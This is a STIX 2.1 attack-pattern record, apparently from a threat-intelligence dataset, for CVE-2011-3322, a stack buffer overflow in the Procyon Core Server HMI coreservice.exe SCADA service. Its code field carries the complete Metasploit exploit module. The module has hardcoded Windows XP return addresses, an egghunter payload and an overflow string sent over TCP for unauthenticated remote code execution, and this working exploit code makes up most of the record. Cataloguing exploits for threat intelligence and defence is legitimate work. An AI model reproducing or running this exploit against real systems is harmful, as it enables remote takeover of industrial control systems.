{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c2b9d79e-8fb0-457c-ae6b-d2abd2a78f52",
    "created": "2024-08-14T16:39:10.268819Z",
    "modified": "2024-08-14T16:39:10.268823Z",
    "name": "\"Procyon Core Server HMI Coreservice.exe Stack Buffer Overflow\"",
    "description": " This module exploits a vulnerability in the coreservice.exe component of Proycon Core Server <= v1.13. While processing a password, the application fails to do proper bounds checking before copying data into a small buffer on the stack. This causes a buffer overflow and allows to overwrite a structured exception handling record on the stack, allowing for unauthenticated remote code execution.  Also, after the payload exits, Coreservice.exe should automatically recover.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/scada/procyon_core_server.rb",
            "external_id": "procyon_core_server.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-3322"
        },
        {
            "source_name": "reference",
            "url": "http://www.stratsec.net/Research/Advisories/Procyon-Core-Server-HMI-Remote-Stack-Overflow"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Egghunter\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Procyon Core Server HMI Coreservice.exe Stack Buffer Overflow\",\n      'Description'    => %q{\n          This module exploits a vulnerability in the coreservice.exe component of Proycon\n        Core Server <= v1.13. While processing a password, the application\n        fails to do proper bounds checking before copying data into a small buffer on the stack.\n        This causes a buffer overflow and allows to overwrite a structured exception handling\n        record on the stack, allowing for unauthenticated remote code execution.  Also, after the\n        payload exits, Coreservice.exe should automatically recover.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Knud Hojgaard <keh[at]nsense.dk>',        # Initial discovery\n          'mr_me <steventhomasseeley[at]gmail.com>', # Initial discovery & poc/msf\n        ],\n      'References'     =>\n        [\n          ['CVE', '2011-3322'],\n          ['OSVDB', '75371'],\n          ['URL', 'http://www.stratsec.net/Research/Advisories/Procyon-Core-Server-HMI-Remote-Stack-Overflow']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\\x0a\\x0d\",\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n\n          [\n            'Windows XP SP3 - No dep bypass',\n            {\n              'Ret'    => 0x774699bf, # JMP ESP [user32.dll]\n              'Edx'    => 0x1D847770, # 0x7712dec2 -> 0x00700040 RW [oleaut32.dll]\n              'Eax'    => 0x01010106, # 0x7712dec2 -> 0x00700040 RW [oleaut32.dll]\n              'Offset' => 8\n            }\n          ],\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2011-09-08',\n      'DefaultTarget'  => 0))\n\n      register_options(\n      [\n        Opt::RPORT(23)\n      ])\n  end\n\n  def check\n    connect\n    res = (sock.get_once || '').chomp  #This gives us string \"----------------------------\"\n    res = (sock.get_once || '').chomp  #This gives us the actual software version\n    disconnect\n\n    if res =~ /Core Command Interface V1\\.(.*)2/\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n\n    eggoptions =\n    {\n      :checksum => false,\n      :eggtag => 'ssec',\n    }\n\n    badchars = \"\\x00\\x0a\\x0d\"\n    hunter,egg = generate_egghunter(payload.encoded, badchars, eggoptions)\n\n    sploit = rand_text_alpha_upper(45)\n    sploit << [target['Edx']].pack('V')\n    sploit << [0x41414141].pack('V')\n    sploit << [target['Eax']].pack('V')\n    sploit << rand_text_alpha_upper(target['Offset'])\n    sploit << [target.ret].pack('V')\n    sploit << make_nops(10)\n    sploit << hunter\n    sploit << rand_text_alpha_upper(500)\n    sploit << egg\n    sploit << \"\\r\\n\"\n\n    connect\n    sock.get_once()\n    print_status(\"Sending request...\")\n    sock.put(sploit)\n    handler()\n    disconnect\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-09-08",
    "x_mitre_platforms": [
        "win'"
    ]
}